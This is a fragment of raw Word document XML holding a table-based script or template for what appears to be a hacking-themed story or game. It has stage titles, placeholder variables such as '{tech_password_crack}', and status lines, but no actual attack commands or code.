                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>n—bu</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="7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252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="7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color w:val="252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>aybe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="7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252525"/>
                <w:position w:val="7"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>it</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="180" w:lineRule="exact"/>
              <w:ind w:left="3353" w:right="438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252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>esn’t</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="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252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>need</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="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252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>to</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="2"/>
                <w:position w:val="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252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="2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color w:val="252525"/>
                <w:position w:val="2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>e</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:right="939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crack</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"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color w:val="252525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.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4208" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="E0D0CC"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:line="200" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="11" w:line="220" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="702" w:right="697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252525"/>
                <w:spacing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ast</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing w:val="-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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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c:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn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ie</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-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ent</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing w:val="1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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>7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.14</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="1346" w:right="1335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Status:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-2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CESS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1044"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="100" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="11"/>
                <w:szCs w:val="11"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="160" w:right="171" w:firstLine="1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color w:val="252525"/>
                <w:spacing w:val="-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ag</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">– </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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as</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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es</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">&amp; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>x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es</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="975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FE7E4"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="16" w:line="240" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="31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{tech_pas</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>w</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525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_cra</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2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k</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"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color w:val="252525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 xml:space="preserve">}       </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="19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252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ass_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>as</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="13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color w:val="252525"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_dea</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:position w:val="13"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">a                    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="49"/>
                <w:position w:val="1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252525"/>
                <w:spacing w:val="-1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R_s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>z</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_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wh</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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s_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn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ie.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1431"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="17"/>
                <w:szCs w:val="17"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="81" w:right="89" w:hanging="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252525"/>
                <w:spacing w:val="-1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color w:val="252525"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color w:val="252525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5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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– APT</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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&amp;</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing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color w:val="252525"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w</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Sh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ell Sy</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ph</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-3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y</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="975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0D0CC"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="160" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="17"/>
                <w:szCs w:val="17"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="3005" w:right="4295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If</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn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ie’s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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wa</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-1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color w:val="252525"/>
                <w:spacing w:val="-2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color w:val="252525"/>
                <w:spacing w:val="-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, then</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="44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{persisten</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>y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color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>_</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">ff}          </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="26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252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>nn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ie’s</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing w:val="-3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color w:val="252525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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>gg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color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ng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. F</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>in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color w:val="252525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252525"/>
                <w:spacing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color w:val="252525"/>
                <w:spacing w:val="-1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 xml:space="preserve">e           </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="10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[Man</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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 xml:space="preserve">ie </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>W</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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tch</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525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color w:val="252525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252525"/>
                <w:spacing w:val="-3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er</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1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color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525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color w:val="252525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itiated]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="3196" w:right="4486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252525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ev</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing w:val="-3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color w:val="252525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te</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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and</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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252525"/>
                <w:spacing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ra</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-3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color w:val="252525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the c</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"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color w:val="252525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kie</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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trail.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CF78E9">
        <w:trPr>
          <w:trHeight w:hRule="exact" w:val="1450"/>
        </w:trPr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B58A80"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="180" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="198" w:right="207" w:hanging="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color w:val="252525"/>
                <w:spacing w:val="-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ag</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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6</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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– Scr</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ip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t Ki</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>dd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ie’s Re</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1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en</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-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e</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="975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FE7E4"/>
          </w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="7" w:line="180" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:spacing w:line="340" w:lineRule="exact"/>
              <w:ind w:left="45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252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>{&lt;ra</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-1"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ndo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>ly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="1"/>
                <w:position w:val="-6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252525"/>
                <w:spacing w:val="-3"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>enera</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
                <w:spacing w:val="-2"/>
                <w:position w:val="-6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color w:val="252525"/>
                <w:position w:val="-6"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">ed            </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525"/>
